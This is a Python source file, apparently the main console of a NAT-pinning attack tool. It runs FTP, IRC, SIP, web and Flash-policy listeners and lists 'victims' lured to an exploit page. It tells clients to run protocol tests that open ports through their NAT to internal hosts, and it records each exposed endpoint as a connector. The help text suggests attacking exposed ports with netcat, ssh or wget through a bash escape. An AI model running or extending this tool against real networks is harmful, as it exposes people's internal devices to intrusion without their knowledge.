#!/usr/bin/env python
from modules import irc
from modules import ftp
from modules import flashpol
from modules import web
from modules import sip
from modules import cmd
from optparse import OptionParser
from tools import ip
import sys
import asyncore
import thread
import readline
import socket
from datetime import datetime
from subprocess import call

class Shell():
	ENGINE = None
	CURR_VICTIM = None
	COMMANDS = "HELP", "LIST", "SET", "TEST", "EXPLOIT", "QUIT", "EXIT"
	def __init__(self, engine):
		global ENGINE
		self.ENGINE = engine
		print "One shell to rule them all"
		val = ""
		#readline.parse_and_bind()
		while val.upper() != "QUIT" and val.upper() != "EXIT":
			val = self.getUserInput()
			self.handleCMD(val)
		self.ENGINE.shutdown()
		#end while
	#end def
	############################################################################
	def getVictims(self):
		for server in self.ENGINE.SERVERS:
			if server.TYPE=="Command Server":
				if server.HANDLER:
					return server.HANDLER.VICTIMS
				else:
					return []
	def getVictimById(self,id):
		victims = self.getVictims()
		if victims != None:
			try:
				result = victims[id]
			except IndexError:
				result = None #invalid list index
		else:	
			result = None
		return result
	############################################################################
	def handleCMD_help(self,parts):
		if len(parts)==1:
			print "Available Commands:"
			print "   help\t\tPrints this message"
			print "   list\t\tlist items, expects list to display; clients, services, Connectors"
			print "   \t\tType help list for more information."
			print "   test\t\tTest natpinning. Command format: test id PROTO IP PORT"
			print "   \t\tType help test for more information."
			print "   !\t\tDrop to shell, usefull to quickly run any command on newly exposed ports (like netcat, telnet, ssh, wget...)"
			print "   \t\tThis is the fun stuff, type 'help exploit' for more information."
			print "   clear\t\t Clears the screen."
			print "   exit\t\tQuits the application."
			print "   quit\t\tQuits the application."
		elif len(parts)==2:
			if parts[1].upper()=="TEST":
				print ""
				print ""
				print "Test: The test command is the bread and butter of this tool, it instructs a client to perform a natpin test."
				print "Format: test ID PROTOCOL HOST PORT"
				print "ID: The list id of the victim you wish to test (0,1,2,..."
				print "PROTOCOL: The protocol you wish to test, FTP, IRC, SIP"
				print "HOST: The IP you want to test, can be victim private ip, or another ip on its LAN (or an external address"
				print "PORT: The port on HOST you want to test."
				print ""
				print ""
			elif parts[1].upper()=="EXPLOIT":
				print "todo"
			elif parts[1].upper()=="LIST":
				print "List: The list command lists objects currently loaded."
				print "   list clients\t\tLists all clients connected to the server."
				print "   list services\tLists all running services."
				print "   list connectors\tLists all succesfully exposed endpoints."
				
	def handleCmd_test(self, args):
		format ="test Client_ID PROTO IP PORT"
		if len(args) != 5:
			print "invalid command format, expected : " + format
		else:
			vic_id = int(args[1])
			proto = args[2].upper()
			ip = args[3]
			port = args[4]
			victim = self.getVictimById(vic_id)
			if victim == None: 
				print "You provided an invalid client id, type 'list clients' for a list of available clients."
			else:
				if proto != "ALL":
					victim.TESTS.append(proto + " " +  ip + " " + str(port))
				else:
					#run all proto tests
					victim.TESTS.append("FTP " +  ip + " " + str(port))
					victim.TESTS.append("IRC " +  ip + " " + str(port))
					victim.TESTS.append("SIP " +  ip + " " + str(port))
	def handleCmd_list(self, item):
		if item.upper()=="CLIENTS":
			victims = self.getVictims() # refresh list
			x = 0
			print "   ID\tClient ID\t\t\tAddress"
			print "--------------------------------------------------------------------------"
			if victims == None:
				print "No clients connected yet: point them to http://yourserver/exploit.html?type=cmd&ci=ip-of-client"
			else:
				for victim in victims:
					lastseen = datetime.now()-victim.LAST_SEEN
					print "   " + str(x) + ".   " + victim.VIC_ID + "\t\t" + victim.PUBLIC_IP + "\t\t" + str(lastseen.seconds)
					x=x+1
		elif item.upper() =="SERVICES":
			print "Currently running services:"
			x = 0
			for server in self.ENGINE.SERVERS:
				print "\t" + str(x) + ".\t" + server.TYPE
				x=x+1
		elif item.upper() =="CONNECTORS":
			print "Connectors:"
			print "IP\t\t\tPORT\tPROTO\tHELPER\t\tCREATED"
			print "----------------------------------------------------------------------------------------------"
			for connector in self.ENGINE.CONNECTORS:
				data = connector.split("|")
				print data[0] + "\t\t" + str(data[1]) + "\t" + str(data[2]) + "\t" + data[3] + "\t\t"  + data[4]
		else:
			print "Invalid list item specified, allowed values are: clients, services,connectors"
	def getUserInput(self):
		prompt = "np> "
		user_input = raw_input(prompt).strip()
		return user_input
	def handleCMD(self,val):
		global CURR_VICTIM
		parts = val.split(" ")
		if parts[0].upper()=="LIST":
			if len(parts)==2:
				self.handleCmd_list(parts[1])
			else:
				self.handleCmd_list("unkown")
		elif parts[0].upper()=="SET":
			if len(parts)==3:
				if parts[1].upper() == "VIC":
					self.CURR_VICTIM = int(parts[2])
					print "Current victim set to " +  self.getVictimById(self.CURR_VICTIM).VIC_ID
		elif parts[0].upper()=="TEST":
			self.handleCmd_test(parts)
		elif parts[0].upper()=="HELP" or parts[0]=="?":
			self.handleCMD_help(parts)
		elif parts[0]=="!":
			call(["bash"])
		elif parts[0].upper()=="CLEAR":
			call(["clear"])
	#end def
#end class

class Engine():
	VERBOSITY = 0
	LOGTYPE = "screen"
	SERVERS = []
	SERVICE_THREAD = None
	CONNECTORS = []
	RULES = []
	def __init__(self, verbosity=0, logType="screen"):
		global VERBOSITY, LOGTYPE
		self.VERBOSITY = verbosity
		LOGTYPE = logType #either "screen" or filename
	#end def
	
	def log(self, value, logLevel):
		if logLevel >= self.VERBOSITY:
			print value
		#end if
	#end def
	def callback(self, host, port, transport, proto):
		if ip.isPrivateAddress(host)==True:
			print "NATPIN FAILED : received private IP " + host
		else:
			print "NATPIN SUCCES : client exposed " + transport + " port " + str(port) + " on IP " + host
			self.addConnector(host,str(port),transport,proto)
	#end def
	def addConnector(self,ip,port, transport, proto):
		global CONNECTORS
		exists = False
		for connector in self.CONNECTORS:
			data = connector.split("|")
			if data[0] == ip and str(data[1])==str(port):
				exists = True
		if exists == False:
			self.CONNECTORS.append(ip + "|" + str(port) + "|" + transport + "|" + proto + "|" + str(datetime.now().time()))
	#end def
	def delConnectors(self):
		#removes all created iptables rules
		self.CONNECTORS = []
	def runServers(self,runCMD,runWeb, runFlash, proto="ALL"):
		global SERVERS, SERVICE_THREAD
		if runCMD == True: self.SERVERS.append(cmd.Server(proto="TCP",serverPort=60003,caller=self))
		if (runWeb==True): self.SERVERS.append(web.Server(serverPort=80,caller=self))#required: flash policy server
		if (runFlash==True): self.SERVERS.append(flashpol.Server(serverPort=843,caller=self))
		if proto== "FTP" or proto== "ALL":
	        	self.SERVERS.append(ftp.Server(serverPort=21,caller=self))
		if proto== "IRC" or proto== "ALL":
			self.SERVERS.append(irc.Server(serverPort=6667,caller=self))
		if proto ==  "SIP" or proto==  "ALL":
			self.SERVERS.append(sip.Server(serverPort=5060,caller=self))
		try:
			self.log("Services running, press CTRL-C to exit.",0)
			self.SERVICE_THREAD = thread.start_new_thread(asyncore.loop,())
		except KeyboardInterrupt:
			self.shutdown()
	#end def
	def shutdown(self):
		global SERVICE_THREAD
		for server in self.SERVERS:
			server.stop()
		self.delConnectors()
		self.SERVICE_THREAD = None
	#end def
#end class

def main():
	parser = OptionParser(usage = '%prog --proto=PROTOCOL --type=CALLBACK_TYPE')
	parser.add_option('--no-web', action="store_false", dest='runweb', default=True, help='Do not run the internal web service (port 80).')
	parser.add_option('--no-flash', action="store_false", dest='runflash', default=True, help='Do not run the internal flash policy service (port 843).')
	parser.add_option('-v', dest='verbose', default=2, help='Verbosity level, default is 2, set to 0 if you like a lot of output.')
	opts, args = parser.parse_args()
	
	
	x = Engine(int(opts.verbose),"screen")
	x.runServers(True,opts.runweb,opts.runflash,"ALL")
	s = Shell(x)
#end def
if __name__ == '__main__':
    main()



